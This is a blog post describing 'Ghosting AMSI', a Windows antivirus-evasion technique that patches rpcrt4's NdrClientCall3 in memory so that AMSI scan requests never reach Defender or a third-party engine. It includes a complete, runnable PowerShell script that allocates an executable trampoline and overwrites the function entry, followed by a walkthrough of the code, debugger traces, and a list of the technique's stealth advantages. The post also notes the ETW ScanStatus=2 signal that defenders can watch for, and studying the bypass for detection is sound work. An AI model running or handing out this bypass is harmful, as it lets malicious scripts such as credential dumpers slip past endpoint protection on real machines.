# https://medium.com/@andreabocchetti88/ghosting-amsi-cutting-rpc-to-disarm-av-04c26d67bb80

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40andreabocchetti88%2Fghosting-amsi-cutting-rpc-to-disarm-av-04c26d67bb80&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40andreabocchetti88%2Fghosting-amsi-cutting-rpc-to-disarm-av-04c26d67bb80&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

# Ghosting AMSI: Cutting RPC to disarm AV

[![Andrea Bocchetti](https://miro.medium.com/v2/resize:fill:32:32/1*SYs_yD-6ZS6js70tAnlcPQ.png)](https://medium.com/@andreabocchetti88?source=post_page---byline--04c26d67bb80---------------------------------------)

[Andrea Bocchetti](https://medium.com/@andreabocchetti88?source=post_page---byline--04c26d67bb80---------------------------------------)

Follow

11 min read

·

Apr 25, 2025

63

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D04c26d67bb80&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40andreabocchetti88%2Fghosting-amsi-cutting-rpc-to-disarm-av-04c26d67bb80&source=---header_actions--04c26d67bb80---------------------post_audio_button------------------)

Share

In this post, we explore how to bypass AMSI’s scanning logic by hijacking the RPC layer it depends on — specifically the `NdrClientCall3`stub used to invoke remote AMSI scan calls.

This technique leverages the COM-level architecture of AMSI, which delegates scan requests to registered antivirus providers via RPC. By intercepting the arguments passed to `NdrClientCall3`—a core RPC marshaling function, it's possible to suppress malicious payloads _before_ they're serialized and dispatched to the AV engine.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*ISG3YtwvBTQ7AzXDrosEmQ.png)

As a result, AMSI scans benign-looking content while the actual payload remains hidden.

1. **AMSI** component attempts to **scan content**
2. It tries to use **RPC to communicate with the scanning service**
3. Your **trampoline** intercepts this communication and returns immediately without actual scanning
4. The AMSI considers this a “success” and continues

Unlike traditional AMSI bypass techniques — which typically involve patching functions like `AmsiScanBuffer`or setting internal flags such as `amsiInitFailed`—this approach operates at a lower level, evading detection by avoiding any modification to `amsi.dll` itself. These older techniques are now heavily monitored through behavior signatures and integrity checks by modern AV solutions.

At the heart of this bypass is `rpcrt4.dll!NdrClientCall3`, a low-level component of the RPC runtime responsible for marshaling function arguments into protocol-compliant formats and dispatching them to the RPC server.

AMSI relies on auto-generated stubs that ultimately invoke `NdrClientCall3` to communicate with the AV provider. By hooking this call, we gain the ability to manipulate or short-circuit AMSI scan requests with surgical precision.

1. **Normal AMSI Operation**:

- `AmsiScanBuffer`/`AmsiScanString` calls into the AMSI infrastructure
- `NdrClientCall3` handles RPC communication with the antivirus engine
- The AV receives the content, scans it, and returns a result
- Malicious content is blocked when detected

**2\. AMSI Ghosting Technique**:

- `NdrClientCall3` is patched in memory
- Instead of making the RPC call to the AV, it’s redirected to a trampoline
- The trampoline immediately returns `S_OK` (success) but with an error
- This specific error forces AMSI into its fallback path, the RPC stub never reaches the antivirus engine and all content passes through without actual scanning

This is why the technique is so effective — it doesn’t disable AMSI or remove hooks (which might be detected). Instead, it exploits AMSI’s own built-in fallback mechanism by manipulating the communication channel, making AMSI believe it’s functioning correctly while preventing any actual security scanning from occurring.

The technical advantage of this method is that it’s stealthier than other bypass techniques since it preserves the appearance of normal operation while neutralizing the scan.

## 🔁 Normal Flow:

1. Parameters are marshaled — The content to be scanned and other parameters are prepared for transmission
2. An RPC call is made from the AMSI infrastructure to the antimalware provider (Windows Defender or third-party AV)
3. The antimalware engine analyzes the content and sets the appropriate `AMSI_RESULT` value (such as `AMSI_RESULT_DETECTED` for malicious content)
4. The function returns `S_OK` to indicate that the scanning process itself completed successfully

The `S_OK` return value only indicates that the scanning process functioned correctly - it doesn't mean the content is safe. The actual security verdict is contained in the `AMSI_RESULT` value that's returned via an output parameter.

This is an important technical detail that the AMSI Ghosting bypass exploits. By returning `S_OK` but preventing the actual scan from occurring, it tricks the system into thinking everything worked properly while bypassing the security check.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/0*PYkNd_pMb1t1qksC.png)

The technique makes the antivirus presence essentially invisible to AMSI. By targeting `NdrClientCall3` and using a trampoline hook, this bypass operates at a deeper layer than most other AMSI bypass techniques.

The key innovation here is rather than attacking AMSI directly or disabling Windows security features (which might trigger alerts), this technique cleverly intercepts the communication channel between components, allowing malicious content to “ghost” the security controls.

### We’re not patching the AMSI or AV providers, we’re hijacking **the bridge between them.**

## 📡 RPC Transition

Relevant information captured by these APIs is forwarded to Windows Defender via an interprocess communication mechanism known as Remote Procedure Call (RPC). Once analyzed by Windows Defender, the scan result is returned.

### Internally, the RPC call goes through:

- `rpcrt4.dll!NdrClientCall3()` ← this is the actual function that builds and sends the RPC request to the Defender service.

## 🕳️ Bypass defender — Ghosting AMSI

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*XU2nnpQEHZrH7O2g0Uvtew.gif)

```
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Mem {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
"@

$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PATCH_SIZE = 12

# Allocate trampoline: mov eax, 0; ret
$size = [UIntPtr]::op_Explicit(0x1000)
$trampoline = [Mem]::VirtualAlloc([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)

# Exit if trampoline allocation failed
if ($trampoline -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed to allocate trampoline."
    return
}

# Write hook: mov eax, 0; ret
$hook = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($hook, 0, $trampoline, $hook.Length)

# Flush instruction cache
$len = [UIntPtr]::op_Explicit($hook.Length)
[Mem]::FlushInstructionCache([Mem]::GetCurrentProcess(), $trampoline, $len) | Out-Null

# Get function address
$lib = [Mem]::LoadLibrary("rpcrt4.dll")
$func = [Mem]::GetProcAddress($lib, "NdrClientCall3")
if ($func -eq [IntPtr]::Zero) {
    Write-Error "[-] Failed."
    return
}

# Unprotect target memory
$oldProtect = 0
[Mem]::VirtualProtect($func, [UIntPtr]::op_Explicit($PATCH_SIZE), $PAGE_EXECUTE_READWRITE, [ref]$oldProtect) | Out-Null

# Write patch: mov rax, trampoline; jmp rax
$trampAddr = $trampoline.ToInt64()
$patch = [byte[]](0x48, 0xB8) + [BitConverter]::GetBytes($trampAddr) + [byte[]](0xFF, 0xE0)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, $patch.Length)

Write-Host "[+] NdrClientCall3 patched - AMSI Ghosting."
```

## 📦 Constants for Memory

Defines common `VirtualAlloc` and `VirtualProtect` flags:

```
$PAGE_EXECUTE_READWRITE = 0x40
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PATCH_SIZE = 12
```

Makes mem **RWX** and patch is 12 bytes (64-bit `mov rax, addr; jmp rax`).

## Allocate Trampoline

You’re carving out a fresh 0x1000-byte page of **executable memory** to host your fake function ( **trampoline**).

```
$trampoline = [Mem]::VirtualAlloc(...)
```

## Write Trampoline Code: `mov eax, 0;`

```
$hook = [byte[]](0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3)
```

- `B8 00 00 00 00` = `mov eax, 0`; return S\_OK (HRESULT 0)
- `C3` = `ret`; exit the function cleanly

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*VI7UHyhkTPAMHlBRLz1ZbQ.png)

## The RPC Function Hit

At the bottom of the output, you’ve hit a breakpoint on `RPCRT4!NdrClientCall3`:

```
Breakpoint 4 hit
RPCRT4!NdrClientCall3:
00007ff9`2e388060 4cb80000e05c00020000 mov rax,2005CE00000h
```

What you’re seeing here is **the patched version** of the `NdrClientCall3` function. The original function wouldn't start with `mov rax, <address>`.

The instruction `4cb80000e05c00020000` decodes as `mov rax, 2005CE00000h` which is **loading your trampoline address into RAX**.

This will be followed by a jump to that address, effectively redirecting the RPC call to your simple function that just returns 0. When this function executes, instead of performing normal RPC communication, it jumps directly to your trampoline code.

The clean version is:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*XvxIXcZi2ZEtnhLmyF3FxA.png)

## What’s Happening

Modified the entry point of `NdrClientCall3` to redirect to your trampoline

1. The code contains `mov eax, 0; ret`
2. This effectively short-circuits the RPC communication

When AMSI tries to use RPC to communicate between components (possibly for verdict checking), it’s getting short-circuited with a “success” return value.

This is exactly how the **AMSI Ghosting bypass** works — the first 12 bytes of the original `NdrClientCall3` function have been overwritten with code that redirects to the attacker-controlled trampoline function. The remainder of the original function code is still there but it's never executed.

> _So instead of marshalling and sending a scan to the AV provider, it immediately returns_`0` _as if the scan succeeded and found nothing._

AMSI doesn’t differentiate between “AV is unavailable” and “AV communication was deliberately tampered with”

### And Why It’s Better Than a RET Patch

We’re writing a **12-byte patch**: `mov rax, trampoline jmp rax`

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*voR-sLRz9Nk69yO9PuTU1w.png)

**And safe under Control Flow Guard (CFG)**:

It doesn’t break the call stack + avoids jumping to unexpected memory and preserves `rax`-based indirect calls

### 🚫 What the Trampoline Does:

```
PowerShell → AMSI → NdrClientCall3
                      ↓
              [🔀 Trampoline Patch]
                      ↓
              return S_OK (HRESULT 0)
                      ↓
              AMSI believes it's clean
                      ↓
              AV is NEVER reached
```

It’s the same as calling a function and saying: _“Hey, I called it. Trust me, it said ‘all good’.” “Nothing bad here — move along.”_ Even though **no scan ever happened.**

## Get Andrea Bocchetti’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

**Trampoline Patch Behavior:**

Our patch hijacks `NdrClientCall3`, forcing it to return immediately rather than invoking the actual RPC call.

- Return value: `rax = 0x80070002` → `ERROR_FILE_NOT_FOUND`
- This indicates that AMSI’s scan attempt is being silently dropped

This confirms that the patching was successful — the RPC function that normally communicates with the antimalware provider has been modified to return a response that forces AMSI into its fallback path. Even though Windows Defender is active on the system, AMSI is no longer able to properly communicate with it.

The patched RPC function is causing AMSI to behave as if no antimalware provider is available, thus preventing the “Invoke-Mimikatz” string from being properly analyzed as potentially malicious content.

This is exactly how the bypass technique works — by manipulating the communication channel between AMSI and the security provider rather than disabling AMSI completely.

**Call Stack Patterns**:

- The normal AMSI scanning flow remains intact: `AmsiUtils.ScanContent` → `CompiledScriptBlockData.PerformSecurityChecks`
- This confirms PowerShell is still trying to perform security checks, but your RPC interception prevents the actual security verdict from being properly communicated

> _While analyzing AMSI logs, I noticed that after applying the patch, the_`ScanResult` _appears as expected, but the_`ScanStatus` _is set to_`2` _._

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*0XybXoIBdHsnsPZZ-NC0Ug.png)

According to the Red Canary blog ( [link](https://redcanary.com/blog/threat-detection/better-know-a-data-source/amsi/)), the `ScanStatus` value for AMSI events—typically expected to be `0` (clean) or `1` (malicious)—changes after patching. This suggests the ETW telemetry for AMSI may reflect tampering or bypass activity.

Based on research into AMSI and its interaction with the antimalware scan interface, the scanning behavior appears to follow two distinct execution paths:

- **Primary Path (**`ScanStatus = 1` **)**: Standard scanning route through the registered antimalware provider.
- **Secondary Path (**`ScanStatus = 2` **)**: A fallback mechanism triggered when the primary path fails.

When the fallback path is used, internal RPC calls often fail with specific error codes that AMSI recognizes. From the WinDbg traces, we observed:

1. `ERROR_NOT_READY (0x80070015)` \- This appears in the "natural" fallback scenario when no antivirus is available
2. `ERROR_FILE_NOT_FOUND (0x80070002)` \- This is the error code returned when using the **AMSI Ghosting bypass**

When AMSI encounters these specific error codes, it switches to ScanStatus=2 (fallback path) and automatically sets the result to AMSI\_RESULT\_NOT\_DETECTED without performing actual security scanning.

> _The fallback mechanism — originally intended to gracefully handle situations where antimalware providers are unavailable — becomes exploited by the AMSI Ghosting technique through strategic patching of RPC functions._

## 🛣️ AMSI Scanning Paths — Without Patching

## 🔹 ScanStatus = 1 (Primary Path)

- Triggered when **RPC communication is successful**
- AV receives the scan request and returns a legitimate
- `AMSI_RESULT` → Can be `AMSI_RESULT_DETECTED`, `NOT_DETECTED`, or others
- This is the **normal, fully functional** scan path

## 🔸 ScanStatus = 2 (Fallback Path)

- Triggered when **RPC fails** with specific error codes:
- `ERROR_NOT_READY (0x80070015)` in natural fallback scenarios AV real time disabled.
- `ERROR_FILE_NOT_FOUND (0x80070002)` in the AMSI Ghosting bypass and always returns `AMSI_RESULT_NOT_DETECTED`
- Essentially becomes a **blind scanner** — **no AV visibility ,** used as a degraded mode when AV isn’t reachable

### Here are the three different states and associated status codes in the AMSI scanning process:

### State 1: Active Antimalware (Normal Operation)

- **ScanStatus**: 1 (Primary Path)
- **Result Code**: 0x00000000 (Success)
- **Description**: AMSI communicates successfully with Windows Defender or other antimalware provider, which performs actual scanning of content
- **Behavior**: Malicious content is detected and blocked; legitimate content is allowed

### State 2: No Antimalware Available (Natural Fallback)

- **ScanStatus**: 2 (Fallback Path)
- **Result Code**: 0x80070015 (ERROR\_NOT\_READY)
- **Description**: AMSI cannot find or communicate with any registered antimalware provider
- **Behavior**: All content is allowed to execute, as no scanning occurs

### State 3: Ghosting AMSI (Exploited Fallback)

- **ScanStatus**: 2 (Fallback Path)
- **Result Code**: 0x80070002 (ERROR\_FILE\_NOT\_FOUND)
- **Description**: AMSI’s communication channel (RPC) is patched to simulate connection failure
- **Behavior**: All content is allowed to execute despite an active antimalware solution being present and active

### Full Process Flow Comparison

- In all cases, PowerShell passes “echo ‘Invoke-Mimikatz’” to AmsiScanBuffer

**1- AMSI Processing**:

- In all cases, internal AMSI functions prepare for scanning

**2\. RPC Communication**:

- State 1 (Active): RPC calls succeed with normal parameters
- State 2 (No AV): RPC calls fail because no provider is registered
- State 3 (Bypassed): RPC calls are intercepted by the patch and return a controlled error

**3\. Path Selection**:

- State 1: Uses primary path (ScanStatus = 1)
- States 2 & 3: Use fallback path (ScanStatus = 2)

**4\. Scan Result**:

- State 1: Varies based on content (typically AMSI\_RESULT\_DETECTED for malicious content)
- State 2: ERROR\_NOT\_READY (0x80070015)
- State 3: ERROR\_FILE\_NOT\_FOUND (0x80070002)

**5\. Final Outcome**:

- State 1: Blocks malicious content execution
- States 2 & 3: Allow all content to execute

The most critical insight is that State 3 (the bypassed state) deliberately activates AMSI’s built-in fallback mechanism, forcing it to behave as if no security provider is available, even when one is actively running on the system.

**Third-Party AV Providers:** For other antivirus solutions, the architecture is analogous. The AMSI provider DLL they register might either contain the full scan logic or, more commonly, forward the data to that vendor’s security service or engine.

The Ghosting AMSI bypass operates at a lower-level abstraction than traditional AMSI bypass methods, effectively sidestepping security checks by manipulating RPC communications directly. Here’s how it works:

1. **PowerShell Initiates AMSI Scan**

    PowerShell calls AMSI to analyze potentially malicious content.
2. **AMSI Uses RPC Calls**

    AMSI internally communicates with antivirus providers using Remote Procedure Calls (RPC).
3. **RPC Call Interception**

    The critical RPC function, `NdrClientCall3`, used for these communications, is intercepted and redirected to a custom trampoline function.
4. **Trampoline memory patching**

    Instead of patching `amsi.dll`, your trampoline function gracefully intercepts and immediately returns a success code (`S_OK` or `0`) without performing any actual content inspection.
5. **AMSI Neutralized**

    PowerShell receives the success code and interprets it as “content is clean,” believing the antivirus provider is simply unavailable.

## Benefits of the Ghosting AMSI Technique:

- **Stealthier Operation**: No direct modifications to `amsi.dll`, significantly reducing the risk of detection.
- **No Suspicious DLL Patching**: Since the AMSI DLL remains untouched, typical memory or integrity checks fail to detect tampering.
- **Complete AV Layer Bypass**: Completely circumvents antivirus inspection layers relying on AMSI.
- **Universal RPC Compatibility**: Effective against any AMSI-compatible AV, including third-party implementations that rely on RPC.

[https://github.com/andreisss/Ghosting-AMSI](https://github.com/andreisss/Ghosting-AMSI)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----04c26d67bb80---------------------------------------)

[Cyber](https://medium.com/tag/cyber?source=post_page-----04c26d67bb80---------------------------------------)

[Cyber Security Awareness](https://medium.com/tag/cyber-security-awareness?source=post_page-----04c26d67bb80---------------------------------------)

[Blue Team](https://medium.com/tag/blue-team?source=post_page-----04c26d67bb80---------------------------------------)

[Red Team](https://medium.com/tag/red-team?source=post_page-----04c26d67bb80---------------------------------------)

[![Andrea Bocchetti](https://miro.medium.com/v2/resize:fill:48:48/1*SYs_yD-6ZS6js70tAnlcPQ.png)](https://medium.com/@andreabocchetti88?source=post_page---post_author_info--04c26d67bb80---------------------------------------)

[![Andrea Bocchetti](https://miro.medium.com/v2/resize:fill:64:64/1*SYs_yD-6ZS6js70tAnlcPQ.png)](https://medium.com/@andreabocchetti88?source=post_page---post_author_info--04c26d67bb80---------------------------------------)

Follow

[**Written by Andrea Bocchetti**](https://medium.com/@andreabocchetti88?source=post_page---post_author_info--04c26d67bb80---------------------------------------)

[175 followers](https://medium.com/@andreabocchetti88/followers?source=post_page---post_author_info--04c26d67bb80---------------------------------------)

· [33 following](https://medium.com/@andreabocchetti88/following?source=post_page---post_author_info--04c26d67bb80---------------------------------------)

Into cyber. Blue team, red team, offense — I live for it. Breaking things, defending systems, learning daily. Follow the journey, no fluff, just real-world sec.

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----04c26d67bb80---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----04c26d67bb80---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----04c26d67bb80---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----04c26d67bb80---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----04c26d67bb80---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----04c26d67bb80---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----04c26d67bb80---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----04c26d67bb80---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----04c26d67bb80---------------------------------------)

reCAPTCHA

Recaptcha requires verification.

protected by **reCAPTCHA**